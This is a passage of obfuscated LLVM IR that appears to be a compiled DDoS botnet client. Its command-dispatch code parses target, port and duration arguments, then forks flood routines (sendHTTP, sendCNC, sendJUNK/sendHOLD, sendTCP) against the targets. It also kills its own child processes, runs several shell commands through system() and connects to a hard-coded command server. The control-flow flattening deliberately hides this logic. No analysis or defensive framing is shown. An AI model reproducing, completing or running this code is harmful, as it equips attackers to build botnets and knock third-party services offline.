  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  %534 = call i32 @listFork()
  %535 = icmp ne i32 %534, 0
  %536 = select i1 %535, i32 -2091781421, i32 -412212832
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  store i32 0, i32* %30, align 4
  store i32 -2018601254, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i32, i32* %30, align 4
  %541 = icmp slt i32 %540, 10
  %542 = select i1 %541, i32 -1718657698, i32 1234578545
  store i32 %542, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8*, i8** %26, align 8
  %545 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* %544, i32 %545)
  %546 = load i32, i32* %30, align 4
  %547 = add nsw i32 %546, 1
  store i32 %547, i32* %30, align 4
  store i32 -2018601254, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = load i32, i32* @mainCommSock, align 4
  %550 = call i32 @close(i32 %549)
  call void @_exit(i32 0) #12
  unreachable

; <label>:551:                                    ; preds = %loopEntry
  store i32 -1008405830, i32* %switchVar
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  %553 = load i8**, i8*** %4, align 8
  %554 = getelementptr inbounds i8*, i8** %553, i64 0
  %555 = load i8*, i8** %554, align 8
  %556 = call i32 @strcmp(i8* %555, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0)) #10
  %557 = icmp ne i32 %556, 0
  %558 = select i1 %557, i32 -189627271, i32 915498450
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i32, i32* %3, align 4
  %561 = icmp slt i32 %560, 4
  %562 = select i1 %561, i32 1269920982, i32 631938139
  store i32 %562, i32* %switchVar
  br label %loopEnd

; <label>:563:                                    ; preds = %loopEntry
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 2
  %566 = load i8*, i8** %565, align 8
  %567 = call i32 @atoi(i8* %566) #10
  %568 = icmp slt i32 %567, 1
  %569 = select i1 %568, i32 1269920982, i32 473624561
  store i32 %569, i32* %switchVar
  br label %loopEnd

; <label>:570:                                    ; preds = %loopEntry
  %571 = load i8**, i8*** %4, align 8
  %572 = getelementptr inbounds i8*, i8** %571, i64 3
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @atoi(i8* %573) #10
  %575 = icmp slt i32 %574, 1
  %576 = select i1 %575, i32 1269920982, i32 -1211119159
  store i32 %576, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  %579 = load i8**, i8*** %4, align 8
  %580 = getelementptr inbounds i8*, i8** %579, i64 1
  %581 = load i8*, i8** %580, align 8
  store i8* %581, i8** %31, align 8
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 2
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #10
  store i32 %585, i32* %32, align 4
  %586 = load i8**, i8*** %4, align 8
  %587 = getelementptr inbounds i8*, i8** %586, i64 3
  %588 = load i8*, i8** %587, align 8
  %589 = call i32 @atoi(i8* %588) #10
  store i32 %589, i32* %33, align 4
  %590 = load i8*, i8** %31, align 8
  %591 = call i8* @strstr(i8* %590, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %592 = icmp ne i8* %591, null
  %593 = select i1 %592, i32 1815182434, i32 811344434
  store i32 %593, i32* %switchVar
  br label %loopEnd

; <label>:594:                                    ; preds = %loopEntry
  %595 = load i8*, i8** %31, align 8
  %596 = call i8* @strtok(i8* %595, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %596, i8** %34, align 8
  store i32 -1841070081, i32* %switchVar
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  %598 = load i8*, i8** %34, align 8
  %599 = icmp ne i8* %598, null
  %600 = select i1 %599, i32 -1756775969, i32 41924369
  store i32 %600, i32* %switchVar
  br label %loopEnd

; <label>:601:                                    ; preds = %loopEntry
  %602 = call i32 @listFork()
  %603 = icmp ne i32 %602, 0
  %604 = select i1 %603, i32 -472251543, i32 -2117590039
  store i32 %604, i32* %switchVar
  br label %loopEnd

; <label>:605:                                    ; preds = %loopEntry
  %606 = load i8*, i8** %34, align 8
  %607 = load i32, i32* %32, align 4
  %608 = load i32, i32* %33, align 4
  call void @sendCNC(i8* %606, i32 %607, i32 %608)
  %609 = load i32, i32* @mainCommSock, align 4
  %610 = call i32 @close(i32 %609)
  call void @_exit(i32 0) #12
  unreachable

; <label>:611:                                    ; preds = %loopEntry
  %612 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %612, i8** %34, align 8
  store i32 -1841070081, i32* %switchVar
  br label %loopEnd

; <label>:613:                                    ; preds = %loopEntry
  store i32 -1511217997, i32* %switchVar
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = call i32 @listFork()
  %616 = icmp ne i32 %615, 0
  %617 = select i1 %616, i32 510593376, i32 -261757425
  store i32 %617, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i8*, i8** %31, align 8
  %621 = load i32, i32* %32, align 4
  %622 = load i32, i32* %33, align 4
  call void @sendCNC(i8* %620, i32 %621, i32 %622)
  call void @_exit(i32 0) #12
  unreachable

; <label>:623:                                    ; preds = %loopEntry
  store i32 -189627271, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  %625 = load i8**, i8*** %4, align 8
  %626 = getelementptr inbounds i8*, i8** %625, i64 0
  %627 = load i8*, i8** %626, align 8
  %628 = call i32 @strcmp(i8* %627, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0)) #10
  %629 = icmp ne i32 %628, 0
  %630 = select i1 %629, i32 -1703202806, i32 -290773505
  store i32 %630, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  %632 = load i32, i32* %3, align 4
  %633 = icmp slt i32 %632, 4
  %634 = select i1 %633, i32 1302227476, i32 -1669121317
  store i32 %634, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  %636 = load i8**, i8*** %4, align 8
  %637 = getelementptr inbounds i8*, i8** %636, i64 2
  %638 = load i8*, i8** %637, align 8
  %639 = call i32 @atoi(i8* %638) #10
  %640 = icmp slt i32 %639, 1
  %641 = select i1 %640, i32 1302227476, i32 1907221555
  store i32 %641, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 3
  %645 = load i8*, i8** %644, align 8
  %646 = call i32 @atoi(i8* %645) #10
  %647 = icmp slt i32 %646, 1
  %648 = select i1 %647, i32 1302227476, i32 976279509
  store i32 %648, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  %651 = load i8**, i8*** %4, align 8
  %652 = getelementptr inbounds i8*, i8** %651, i64 1
  %653 = load i8*, i8** %652, align 8
  store i8* %653, i8** %35, align 8
  %654 = load i8**, i8*** %4, align 8
  %655 = getelementptr inbounds i8*, i8** %654, i64 2
  %656 = load i8*, i8** %655, align 8
  %657 = call i32 @atoi(i8* %656) #10
  store i32 %657, i32* %36, align 4
  %658 = load i8**, i8*** %4, align 8
  %659 = getelementptr inbounds i8*, i8** %658, i64 3
  %660 = load i8*, i8** %659, align 8
  %661 = call i32 @atoi(i8* %660) #10
  store i32 %661, i32* %37, align 4
  %662 = load i8*, i8** %35, align 8
  %663 = call i8* @strstr(i8* %662, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %664 = icmp ne i8* %663, null
  %665 = select i1 %664, i32 -1092532633, i32 -1820226440
  store i32 %665, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  %667 = load i8*, i8** %35, align 8
  %668 = call i8* @strtok(i8* %667, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %668, i8** %38, align 8
  store i32 -1070141248, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load i8*, i8** %38, align 8
  %671 = icmp ne i8* %670, null
  %672 = select i1 %671, i32 1386585032, i32 -209795591
  store i32 %672, i32* %switchVar
  br label %loopEnd

; <label>:673:                                    ; preds = %loopEntry
  %674 = call i32 @listFork()
  %675 = icmp ne i32 %674, 0
  %676 = select i1 %675, i32 -930715847, i32 -2128824067
  store i32 %676, i32* %switchVar
  br label %loopEnd

; <label>:677:                                    ; preds = %loopEntry
  %678 = load i8*, i8** %38, align 8
  %679 = load i32, i32* %36, align 4
  %680 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* %678, i32 %679, i32 %680)
  %681 = load i8*, i8** %38, align 8
  %682 = load i32, i32* %36, align 4
  %683 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* %681, i32 %682, i32 %683)
  %684 = load i32, i32* @mainCommSock, align 4
  %685 = call i32 @close(i32 %684)
  call void @_exit(i32 0) #12
  unreachable

; <label>:686:                                    ; preds = %loopEntry
  %687 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %687, i8** %38, align 8
  store i32 -1070141248, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  store i32 -1618700991, i32* %switchVar
  br label %loopEnd

; <label>:689:                                    ; preds = %loopEntry
  %690 = call i32 @listFork()
  %691 = icmp ne i32 %690, 0
  %692 = select i1 %691, i32 1832951847, i32 -1168852112
  store i32 %692, i32* %switchVar
  br label %loopEnd

; <label>:693:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:694:                                    ; preds = %loopEntry
  %695 = load i8*, i8** %35, align 8
  %696 = load i32, i32* %36, align 4
  %697 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* %695, i32 %696, i32 %697)
  %698 = load i8*, i8** %35, align 8
  %699 = load i32, i32* %36, align 4
  %700 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* %698, i32 %699, i32 %700)
  call void @_exit(i32 0) #12
  unreachable

; <label>:701:                                    ; preds = %loopEntry
  store i32 -1703202806, i32* %switchVar
  br label %loopEnd

; <label>:702:                                    ; preds = %loopEntry
  %703 = load i8**, i8*** %4, align 8
  %704 = getelementptr inbounds i8*, i8** %703, i64 0
  %705 = load i8*, i8** %704, align 8
  %706 = call i32 @strcmp(i8* %705, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0)) #10
  %707 = icmp ne i32 %706, 0
  %708 = select i1 %707, i32 -2055742243, i32 -867218446
  store i32 %708, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i32, i32* %3, align 4
  %711 = icmp slt i32 %710, 6
  %712 = select i1 %711, i32 1331394146, i32 1581672832
  store i32 %712, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = load i8**, i8*** %4, align 8
  %715 = getelementptr inbounds i8*, i8** %714, i64 3
  %716 = load i8*, i8** %715, align 8
  %717 = call i32 @atoi(i8* %716) #10
  %718 = icmp eq i32 %717, -1
  %719 = select i1 %718, i32 1331394146, i32 2047332956
  store i32 %719, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  %721 = load i8**, i8*** %4, align 8
  %722 = getelementptr inbounds i8*, i8** %721, i64 2
  %723 = load i8*, i8** %722, align 8
  %724 = call i32 @atoi(i8* %723) #10
  %725 = icmp eq i32 %724, -1
  %726 = select i1 %725, i32 1331394146, i32 -113887702
  store i32 %726, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  %728 = load i8**, i8*** %4, align 8
  %729 = getelementptr inbounds i8*, i8** %728, i64 4
  %730 = load i8*, i8** %729, align 8
  %731 = call i32 @atoi(i8* %730) #10
  %732 = icmp eq i32 %731, -1
  %733 = select i1 %732, i32 1331394146, i32 1315765453
  store i32 %733, i32* %switchVar
  br label %loopEnd

; <label>:734:                                    ; preds = %loopEntry
  %735 = load i8**, i8*** %4, align 8
  %736 = getelementptr inbounds i8*, i8** %735, i64 4
  %737 = load i8*, i8** %736, align 8
  %738 = call i32 @atoi(i8* %737) #10
  %739 = icmp sgt i32 %738, 32
  %740 = select i1 %739, i32 1331394146, i32 1883258704
  store i32 %740, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  %742 = load i32, i32* %3, align 4
  %743 = icmp sgt i32 %742, 6
  %744 = select i1 %743, i32 1227300810, i32 443474371
  store i32 %744, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = load i8**, i8*** %4, align 8
  %747 = getelementptr inbounds i8*, i8** %746, i64 6
  %748 = load i8*, i8** %747, align 8
  %749 = call i32 @atoi(i8* %748) #10
  %750 = icmp slt i32 %749, 0
  %751 = select i1 %750, i32 1331394146, i32 443474371
  store i32 %751, i32* %switchVar
  br label %loopEnd

; <label>:752:                                    ; preds = %loopEntry
  %753 = load i32, i32* %3, align 4
  %754 = icmp eq i32 %753, 8
  %755 = select i1 %754, i32 -1247881128, i32 1900494727
  store i32 %755, i32* %switchVar
  br label %loopEnd

; <label>:756:                                    ; preds = %loopEntry
  %757 = load i8**, i8*** %4, align 8
  %758 = getelementptr inbounds i8*, i8** %757, i64 7
  %759 = load i8*, i8** %758, align 8
  %760 = call i32 @atoi(i8* %759) #10
  %761 = icmp slt i32 %760, 1
  %762 = select i1 %761, i32 1331394146, i32 1900494727
  store i32 %762, i32* %switchVar
  br label %loopEnd

; <label>:763:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  %765 = load i8**, i8*** %4, align 8
  %766 = getelementptr inbounds i8*, i8** %765, i64 1
  %767 = load i8*, i8** %766, align 8
  store i8* %767, i8** %39, align 8
  %768 = load i8**, i8*** %4, align 8
  %769 = getelementptr inbounds i8*, i8** %768, i64 2
  %770 = load i8*, i8** %769, align 8
  %771 = call i32 @atoi(i8* %770) #10
  store i32 %771, i32* %40, align 4
  %772 = load i8**, i8*** %4, align 8
  %773 = getelementptr inbounds i8*, i8** %772, i64 3
  %774 = load i8*, i8** %773, align 8
  %775 = call i32 @atoi(i8* %774) #10
  store i32 %775, i32* %41, align 4
  %776 = load i8**, i8*** %4, align 8
  %777 = getelementptr inbounds i8*, i8** %776, i64 4
  %778 = load i8*, i8** %777, align 8
  %779 = call i32 @atoi(i8* %778) #10
  store i32 %779, i32* %42, align 4
  %780 = load i8**, i8*** %4, align 8
  %781 = getelementptr inbounds i8*, i8** %780, i64 5
  %782 = load i8*, i8** %781, align 8
  store i8* %782, i8** %43, align 8
  %783 = load i32, i32* %3, align 4
  %784 = icmp eq i32 %783, 8
  %785 = select i1 %784, i32 884902484, i32 -777518794
  store i32 %785, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  %787 = load i8**, i8*** %4, align 8
  %788 = getelementptr inbounds i8*, i8** %787, i64 7
  %789 = load i8*, i8** %788, align 8
  %790 = call i32 @atoi(i8* %789) #10
  store i32 295500757, i32* %switchVar
  store i32 %790, i32* %.reg2mem4
  br label %loopEnd

; <label>:791:                                    ; preds = %loopEntry
  store i32 295500757, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:792:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %44, align 4
  %793 = load i32, i32* %3, align 4
  %794 = icmp sgt i32 %793, 6
  %795 = select i1 %794, i32 -1402605199, i32 -1081605824
  store i32 %795, i32* %switchVar
  br label %loopEnd

; <label>:796:                                    ; preds = %loopEntry
  %797 = load i8**, i8*** %4, align 8
  %798 = getelementptr inbounds i8*, i8** %797, i64 6
  %799 = load i8*, i8** %798, align 8
  %800 = call i32 @atoi(i8* %799) #10
  store i32 702964543, i32* %switchVar
  store i32 %800, i32* %.reg2mem6
  br label %loopEnd

; <label>:801:                                    ; preds = %loopEntry
  store i32 702964543, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:802:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %45, align 4
  %803 = load i8*, i8** %39, align 8
  %804 = call i8* @strstr(i8* %803, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %805 = icmp ne i8* %804, null
  %806 = select i1 %805, i32 -666542464, i32 1686751208
  store i32 %806, i32* %switchVar
  br label %loopEnd

; <label>:807:                                    ; preds = %loopEntry
  %808 = load i8*, i8** %39, align 8
  %809 = call i8* @strtok(i8* %808, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %809, i8** %46, align 8
  store i32 1778394885, i32* %switchVar
  br label %loopEnd

; <label>:810:                                    ; preds = %loopEntry
  %811 = load i8*, i8** %46, align 8
  %812 = icmp ne i8* %811, null
  %813 = select i1 %812, i32 -1866736571, i32 1934643377
  store i32 %813, i32* %switchVar
  br label %loopEnd

; <label>:814:                                    ; preds = %loopEntry
  %815 = call i32 @listFork()
  %816 = icmp ne i32 %815, 0
  %817 = select i1 %816, i32 945821307, i32 -617294523
  store i32 %817, i32* %switchVar
  br label %loopEnd

; <label>:818:                                    ; preds = %loopEntry
  %819 = load i8*, i8** %46, align 8
  %820 = load i32, i32* %40, align 4
  %821 = load i32, i32* %41, align 4
  %822 = load i32, i32* %42, align 4
  %823 = load i8*, i8** %43, align 8
  %824 = load i32, i32* %45, align 4
  %825 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %819, i32 %820, i32 %821, i32 %822, i8* %823, i32 %824, i32 %825)
  call void @_exit(i32 0) #12
  unreachable

; <label>:826:                                    ; preds = %loopEntry
  %827 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %827, i8** %46, align 8
  store i32 1778394885, i32* %switchVar
  br label %loopEnd

; <label>:828:                                    ; preds = %loopEntry
  store i32 56859506, i32* %switchVar
  br label %loopEnd

; <label>:829:                                    ; preds = %loopEntry
  %830 = call i32 @listFork()
  %831 = icmp ne i32 %830, 0
  %832 = select i1 %831, i32 310600487, i32 -1092210317
  store i32 %832, i32* %switchVar
  br label %loopEnd

; <label>:833:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:834:                                    ; preds = %loopEntry
  %835 = load i8*, i8** %39, align 8
  %836 = load i32, i32* %40, align 4
  %837 = load i32, i32* %41, align 4
  %838 = load i32, i32* %42, align 4
  %839 = load i8*, i8** %43, align 8
  %840 = load i32, i32* %45, align 4
  %841 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %835, i32 %836, i32 %837, i32 %838, i8* %839, i32 %840, i32 %841)
  call void @_exit(i32 0) #12
  unreachable

; <label>:842:                                    ; preds = %loopEntry
  store i32 -2055742243, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  %844 = load i8**, i8*** %4, align 8
  %845 = getelementptr inbounds i8*, i8** %844, i64 0
  %846 = load i8*, i8** %845, align 8
  %847 = call i32 @strcmp(i8* %846, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i32 0, i32 0)) #10
  %848 = icmp ne i32 %847, 0
  %849 = select i1 %848, i32 -1936309781, i32 1556674205
  store i32 %849, i32* %switchVar
  br label %loopEnd

; <label>:850:                                    ; preds = %loopEntry
  store i32 0, i32* %47, align 4
  store i64 0, i64* %48, align 8
  store i32 1928161300, i32* %switchVar
  br label %loopEnd

; <label>:851:                                    ; preds = %loopEntry
  %852 = load i64, i64* %48, align 8
  %853 = load i64, i64* @numpids, align 8
  %854 = icmp ult i64 %852, %853
  %855 = select i1 %854, i32 -867671671, i32 -67052599
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = load i32*, i32** @pids, align 8
  %858 = load i64, i64* %48, align 8
  %859 = getelementptr inbounds i32, i32* %857, i64 %858
  %860 = load i32, i32* %859, align 4
  %861 = icmp ne i32 %860, 0
  %862 = select i1 %861, i32 1270850138, i32 -377452916
  store i32 %862, i32* %switchVar
  br label %loopEnd

; <label>:863:                                    ; preds = %loopEntry
  %864 = load i32*, i32** @pids, align 8
  %865 = load i64, i64* %48, align 8
  %866 = getelementptr inbounds i32, i32* %864, i64 %865
  %867 = load i32, i32* %866, align 4
  %868 = call i32 @getpid() #2
  %869 = icmp ne i32 %867, %868
  %870 = select i1 %869, i32 -1960748518, i32 -377452916
  store i32 %870, i32* %switchVar
  br label %loopEnd

; <label>:871:                                    ; preds = %loopEntry
  %872 = load i32*, i32** @pids, align 8
  %873 = load i64, i64* %48, align 8
  %874 = getelementptr inbounds i32, i32* %872, i64 %873
  %875 = load i32, i32* %874, align 4
  %876 = call i32 @kill(i32 %875, i32 9) #2
  %877 = load i32, i32* %47, align 4
  %878 = add nsw i32 %877, 1
  store i32 %878, i32* %47, align 4
  store i32 -377452916, i32* %switchVar
  br label %loopEnd

; <label>:879:                                    ; preds = %loopEntry
  store i32 -1182032713, i32* %switchVar
  br label %loopEnd

; <label>:880:                                    ; preds = %loopEntry
  %881 = load i64, i64* %48, align 8
  %882 = add i64 %881, 1
  store i64 %882, i64* %48, align 8
  store i32 1928161300, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  store i32 -1936309781, i32* %switchVar
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  %885 = load i8**, i8*** %4, align 8
  %886 = getelementptr inbounds i8*, i8** %885, i64 0
  %887 = load i8*, i8** %886, align 8
  %888 = call i32 @strcmp(i8* %887, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0)) #10
  %889 = icmp ne i32 %888, 0
  %890 = select i1 %889, i32 -817571541, i32 -2090270215
  store i32 %890, i32* %switchVar
  br label %loopEnd

; <label>:891:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:892:                                    ; preds = %loopEntry
  %893 = load i8**, i8*** %4, align 8
  %894 = getelementptr inbounds i8*, i8** %893, i64 0
  %895 = load i8*, i8** %894, align 8
  %896 = call i32 @strcmp(i8* %895, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0)) #10
  %897 = icmp ne i32 %896, 0
  %898 = select i1 %897, i32 1517412714, i32 -1629587158
  store i32 %898, i32* %switchVar
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  %900 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.87, i32 0, i32 0))
  %901 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.88, i32 0, i32 0))
  %902 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  %903 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.90, i32 0, i32 0))
  %904 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.91, i32 0, i32 0))
  %905 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0))
  %906 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.93, i32 0, i32 0))
  %907 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.94, i32 0, i32 0))
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:908:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %899, %892, %884, %883, %880, %879, %871, %863, %856, %851, %850, %843, %842, %833, %829, %828, %826, %814, %810, %807, %802, %801, %796, %792, %791, %786, %764, %763, %756, %752, %745, %741, %734, %727, %720, %713, %709, %702, %701, %693, %689, %688, %686, %673, %669, %666, %650, %649, %642, %635, %631, %624, %623, %618, %614, %613, %611, %601, %597, %594, %578, %577, %570, %563, %559, %552, %551, %543, %539, %538, %537, %533, %532, %530, %522, %518, %517, %513, %509, %506, %494, %493, %486, %482, %475, %474, %469, %465, %464, %462, %454, %450, %447, %431, %430, %423, %416, %412, %405, %404, %396, %392, %391, %389, %378, %374, %371, %366, %365, %360, %337, %336, %329, %325, %318, %311, %304, %297, %290, %283, %279, %272, %271, %266, %262, %261, %259, %249, %245, %242, %226, %225, %218, %211, %207, %200, %199, %194, %190, %189, %187, %179, %175, %172, %156, %155, %148, %141, %137, %130, %129, %125, %124, %120, %118, %113, %112, %108, %101, %96, %95, %91, %84, %81, %77, %70, %65, %58, %55, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1515975818, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1515975818, label %first
    i32 289727252, label %8
    i32 677307817, label %11
    i32 -255902803, label %17
    i32 -1077852808, label %18
    i32 1014372097, label %21
    i32 -1922494706, label %32
    i32 1974543911, label %39
    i32 1740177639, label %47
    i32 1376562060, label %48
    i32 -596933415, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 289727252, i32 677307817
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 677307817, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -255902803, i32 -1077852808
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 1014372097, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 1014372097, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 443, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -1922494706, i32 1974543911
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 1974543911, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
